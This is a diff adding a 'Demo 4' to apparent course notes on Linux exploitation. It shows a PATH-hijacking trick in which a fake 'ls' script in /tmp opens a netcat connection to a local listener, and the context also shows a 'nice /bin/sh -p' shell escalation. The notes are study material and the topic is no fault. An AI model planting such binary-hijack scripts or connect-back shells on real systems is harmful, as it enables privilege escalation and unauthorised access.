@@ -950,6 +950,19 @@ https://sec.cybbh.io/public/security/latest/lessons/lesson-10-linux-exploit_sg.h
     -> nice /bin/sh -p
     BAM SHELL
 
+    **Demo 4**
+    cd into /tmp
+    make a script.
+    nano ls
+    #!/bin/bash
+    nc 127.0.0.1 3333
+
+    chmod it. chmod +x ls
+    **create a netcat listener** on another terminal
+    nc -lvp 3333 
+    **run script**
+    **ls has been replaced with a script, to actually run the command, /bin/ls**
+    
 
     
     
